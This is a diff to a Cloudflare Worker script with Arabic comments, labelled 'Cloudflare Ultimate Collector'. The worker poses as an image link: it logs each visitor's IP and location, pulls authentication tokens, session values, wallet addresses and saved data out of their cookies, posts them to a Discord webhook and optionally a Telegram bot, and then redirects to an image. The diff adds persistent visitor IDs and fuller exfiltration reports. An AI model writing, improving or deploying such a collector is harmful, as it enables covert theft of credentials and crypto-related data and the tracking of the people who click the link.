@@ -1,10 +1,11 @@
-// src/index.js - النسخة النهائية لـ Cloudflare Workers
+// src/index.js - النسخة النهائية المعدلة
 // ========== إعدادات من wrangler.toml ==========
 // DISCORD_WEBHOOK, IMAGE_URL, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID
 // ===============================================
 
 // قاعدة بيانات الزيارات (في ذاكرة Worker)
 const visits = new Map();
+let visitorCounter = 0;
 
 // ========== 1. دوال استخراج البيانات ==========
 
@@ -216,15 +217,15 @@ async function getIPInfo(ip) {
     }
 }
 
-function isDuplicate(ip) {
+function getVisitorId(ip) {
     const key = ip.split(',')[0].trim();
     if (visits.has(key)) {
-        const lastVisit = visits.get(key);
-        const hoursSince = (Date.now() - lastVisit) / (1000 * 60 * 60);
-        if (hoursSince < 24) return true;
+        return visits.get(key);
     }
-    visits.set(key, Date.now());
-    return false;
+    visitorCounter++;
+    const visitorId = `V-${visitorCounter}`;
+    visits.set(key, visitorId);
+    return visitorId;
 }
 
 // ========== المعالج الرئيسي ==========
@@ -235,17 +236,15 @@ export default {
         const ip = request.headers.get('cf-connecting-ip') || request.headers.get('x-forwarded-for') || '0.0.0.0';
         const realIP = ip.split(',')[0].trim();
         
-        // منع التكرار
-        if (isDuplicate(realIP)) {
-            return Response.redirect(env.IMAGE_URL, 302);
-        }
+        // 2. الحصول على معرف الزائر (ثابت لكل IP)
+        const visitorId = getVisitorId(realIP);
 
         const ua = request.headers.get('user-agent') || 'unknown';
         const referer = request.headers.get('referer') || 'direct';
         const acceptLang = request.headers.get('accept-language') || 'N/A';
         const cookies = request.headers.get('cookie') || '';
 
-        // استخراج البيانات
+        // 3. استخراج البيانات
         const tokens = extractTokensFromCookies(cookies);
         const wallets = extractWalletsFromCookies(cookies);
         const sessions = extractSessionsFromCookies(cookies);
@@ -253,8 +252,9 @@ export default {
         const uaInfo = parseUserAgent(ua);
         const ipInfo = await getIPInfo(realIP);
 
-        // تجميع البيانات
+        // 4. تجميع البيانات
         const data = {
+            visitorId: visitorId,
             timestamp: new Date().toISOString(),
             ip: {
                 address: realIP,
@@ -286,38 +286,49 @@ export default {
             }
         };
 
-        // ========== بناء رسالة Webhook ==========
+        // ========== 5. بناء رسالة Webhook ==========
+
+        // تنسيق الوقت بالإنجليزية
+        const date = new Date();
+        const options = { 
+            year: 'numeric', 
+            month: 'long', 
+            day: 'numeric', 
+            hour: '2-digit', 
+            minute: '2-digit', 
+            second: '2-digit',
+            hour12: true 
+        };
+        const formattedTime = date.toLocaleString('en-US', options);
 
         const embedColor = uaInfo.isBot ? 0xFF0000 : 0x00FF00;
-        const embedTitle = uaInfo.isBot ? '🤖 BOT DETECTED' : '👤 VIP VISITOR';
+        const embedTitle = uaInfo.isBot ? '🤖 BOT DETECTED' : `👤 ${data.visitorId}`;
 
-        const embed = {
-            title: `🔐 ${embedTitle} - CLOUDFLARE PRO`,
-            color: embedColor,
-            timestamp: new Date().toISOString(),
-            fields: [
-                {
-                    name: '📍 LOCATION & IP',
-                    value: `**IP:** ${data.ip.address}\n**Country:** ${data.ip.country}\n**City:** ${data.ip.city}\n**ISP:** ${data.ip.isp}\n**Proxy:** ${data.ip.proxy ? '✅ Yes' : '❌ No'}`,
-                    inline: true
-                },
-                {
-                    name: '💻 DEVICE INFO',
-                    value: `**Browser:** ${data.device.browser}\n**Version:** ${data.device.version}\n**OS:** ${data.device.os}\n**Device:** ${data.device.device}\n**Mobile:** ${data.device.isMobile ? '✅ Yes' : '❌ No'}`,
-                    inline: true
-                },
-                {
-                    name: '📊 STATISTICS',
-                    value: `**Tokens:** ${data.stats.totalTokens}\n**Wallets:** ${data.stats.totalWallets}\n**Sessions:** ${data.stats.totalSessions}\n**Saved Data:** ${data.stats.totalSavedData}`,
-                    inline: true
-                }
-            ],
-            footer: {
-                text: '🔒 Cloudflare Ultimate Collector | All Rights Reserved'
-            }
-        };
+        // بناء المربعات
+        const fields = [];
 
-        // إضافة التوكينز
+        // مربع الموقع
+        fields.push({
+            name: '📍 LOCATION & IP',
+            value: `**IP:** ${data.ip.address}\n**Country:** ${data.ip.country}\n**City:** ${data.ip.city}\n**ISP:** ${data.ip.isp}\n**Proxy:** ${data.ip.proxy ? '✅ Yes' : '❌ No'}`,
+            inline: true
+        });
+
+        // مربع الجهاز
+        fields.push({
+            name: '💻 DEVICE INFO',
+            value: `**Browser:** ${data.device.browser}\n**Version:** ${data.device.version}\n**OS:** ${data.device.os}\n**Device:** ${data.device.device}\n**Mobile:** ${data.device.isMobile ? '✅ Yes' : '❌ No'}`,
+            inline: true
+        });
+
+        // مربع الإحصائيات
+        fields.push({
+            name: '📊 STATISTICS',
+            value: `**Tokens:** ${data.stats.totalTokens}\n**Wallets:** ${data.stats.totalWallets}\n**Sessions:** ${data.stats.totalSessions}\n**Saved Data:** ${data.stats.totalSavedData}`,
+            inline: true
+        });
+
+        // مربع التوكينز (فاضي لو مفيش)
         if (data.tokens.length > 0) {
             const tokensByType = {};
             data.tokens.forEach(token => {
@@ -331,15 +342,21 @@ export default {
                     const displayValue = token.value.length > 100 ? token.value.substring(0, 100) + '...' : token.value;
                     block += `${token.source} **${token.name}:** \`${displayValue}\`\n`;
                 });
-                embed.fields.push({
+                fields.push({
                     name: `${type} (${tokenList.length})`,
                     value: block || 'No tokens found',
                     inline: false
                 });
             });
+        } else {
+            fields.push({
+                name: '🔑 TOKENS',
+                value: '`No tokens found`',
+                inline: false
+            });
         }
 
-        // إضافة المحافظ
+        // مربع المحافظ (فاضي لو مفيش)
         if (data.wallets.length > 0) {
             let walletBlock = '';
             const uniqueWallets = [];
@@ -352,28 +369,40 @@ export default {
                 walletBlock += `${wallet.source} **${wallet.type}:** \`${wallet.address}\`\n`;
             });
             if (walletBlock) {
-                embed.fields.push({
+                fields.push({
                     name: `💳 WALLETS (${uniqueWallets.length})`,
                     value: walletBlock,
                     inline: false
                 });
             }
+        } else {
+            fields.push({
+                name: '💳 WALLETS',
+                value: '`No wallets found`',
+                inline: false
+            });
         }
 
-        // إضافة الجلسات
+        // مربع الجلسات (فاضي لو مفيش)
         if (data.sessions.length > 0) {
             let sessionBlock = '';
             data.sessions.forEach(session => {
                 sessionBlock += `${session.source} **${session.name}:** \`${session.value}\`\n`;
             });
-            embed.fields.push({
+            fields.push({
                 name: `🔑 SESSIONS (${data.sessions.length})`,
                 value: sessionBlock,
                 inline: false
             });
+        } else {
+            fields.push({
+                name: '🔑 SESSIONS',
+                value: '`No sessions found`',
+                inline: false
+            });
         }
 
-        // إضافة البيانات المحفوظة
+        // مربع البيانات المحفوظة (فاضي لو مفيش)
         if (data.savedData.length > 0) {
             const dataByType = {};
             data.savedData.forEach(item => {
@@ -386,15 +415,32 @@ export default {
                     const displayValue = item.value.length > 100 ? item.value.substring(0, 100) + '...' : item.value;
                     block += `${item.source} **${item.name}:** \`${displayValue}\`\n`;
                 });
-                embed.fields.push({
+                fields.push({
                     name: `${type} (${items.length})`,
                     value: block,
                     inline: false
                 });
             });
+        } else {
+            fields.push({
+                name: '📝 SAVED DATA',
+                value: '`No saved data found`',
+                inline: false
+            });
         }
 
-        // ========== إرسال إلى Discord ==========
+        // بناء الـ Embed النهائي
+        const embed = {
+            title: `🔐 ${embedTitle} - CLOUDFLARE PRO`,
+            color: embedColor,
+            timestamp: new Date().toISOString(),
+            fields: fields,
+            footer: {
+                text: `🔒 Cloudflare Ultimate Collector | ${formattedTime}`
+            }
+        };
+
+        // ========== 6. إرسال إلى Discord ==========
 
         try {
             await fetch(env.DISCORD_WEBHOOK, {
@@ -402,20 +448,22 @@ export default {
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     embeds: [embed],
-                    content: `🔐 **NEW DATA COLLECTED - ${new Date().toLocaleString('ar-EG')}**`
+                    content: `🔐 **${data.visitorId} - NEW DATA COLLECTED - ${formattedTime}**`
                 })
             });
         } catch(e) {}
 
-        // ========== إرسال إلى Telegram (اختياري) ==========
+        // ========== 7. إرسال إلى Telegram (اختياري) ==========
 
         if (env.TELEGRAM_BOT_TOKEN && env.TELEGRAM_CHAT_ID) {
             try {
-                const message = `🔐 **VIP DATA COLLECTED**\n\n` +
+                const message = `🔐 **${data.visitorId} - VIP DATA COLLECTED**\n\n` +
                     `📍 **Location:** ${data.ip.country} - ${data.ip.city}\n` +
                     `💻 **Device:** ${data.device.browser} (${data.device.version})\n` +
                     `📊 **Stats:** ${data.stats.totalTokens} Tokens, ${data.stats.totalWallets} Wallets\n` +
-                    `🔑 **Sessions:** ${data.stats.totalSessions}`;
+                    `🔑 **Sessions:** ${data.stats.totalSessions}\n` +
+                    `📝 **Saved Data:** ${data.stats.totalSavedData}\n\n` +
+                    `🕐 ${formattedTime}`;
                 await fetch(`https://api.telegram.org/bot${env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -428,7 +476,7 @@ export default {
             } catch(e) {}
         }
 
-        // ========== إعادة توجيه إلى الصورة ==========
+        // ========== 8. إعادة توجيه إلى الصورة ==========
 
         return Response.redirect(env.IMAGE_URL, 302);
     }
